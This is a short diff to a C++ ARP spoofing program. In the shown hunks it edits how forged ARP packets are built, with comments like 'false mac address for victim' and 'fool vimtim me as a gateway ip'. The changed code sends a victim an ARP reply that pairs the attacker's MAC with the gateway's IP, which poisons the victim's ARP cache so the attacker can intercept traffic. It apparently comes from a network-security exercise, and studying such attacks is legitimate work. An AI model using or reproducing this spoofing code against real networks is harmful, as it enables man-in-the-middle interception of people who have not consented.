@@ -90,7 +90,7 @@ int main(int argc, char* argv[]) {
         packet.arp_.pln_ = Ip::SIZE;
         packet.arp_.op_ = htons(ArpHdr::Request);
         packet.arp_.smac_ = packet.eth_.smac_;
-        packet.arp_.sip_ = htonl(Ip(atc_ip));
+        packet.arp_.sip_ = htonl(Ip(argv[i*2+3]));//Ip(atc_ip));
         packet.arp_.tmac_ = Mac::nullMac();
         packet.arp_.tip_ = htonl(Ip(argv[i * 2 + 2]));
 
@@ -115,16 +115,15 @@ int main(int argc, char* argv[]) {
         packet.eth_.dmac_ = Mac(t_mac);   //true victim mac
         packet.eth_.smac_ = Mac(atc_mac);
         packet.eth_.type_ = htons(EthHdr::Arp);
-        printf("asd\n");
         packet.arp_.hrd_ = htons(ArpHdr::ETHER);
         packet.arp_.pro_ = htons(EthHdr::Ip4);
         packet.arp_.hln_ = Mac::SIZE;
         packet.arp_.pln_ = Ip::SIZE;
         packet.arp_.op_ = htons(ArpHdr::Reply);
 
-        Mac asd = Mac::randomMac();
-        packet.arp_.smac_ = asd;//atc_mac);   //false mac address for victim
-        printf("MAC address of %s: %s\n", argv[i * 2 + 2], std::string(asd).c_str());
+        //Mac asd = Mac::randomMac();
+        packet.arp_.smac_ = Mac(atc_mac);   //false mac address for victim
+        //printf("MAC address of %s: %s\n", argv[i * 2 + 2], std::string(asd).c_str());
         packet.arp_.sip_ = htonl(Ip(argv[i * 2 + 3])); //fool vimtim me as a gateway ip
         packet.arp_.tmac_ = Mac(t_mac);   //victim mac
         packet.arp_.tip_ = htonl(Ip(argv[i * 2 + 2])); //victim ip
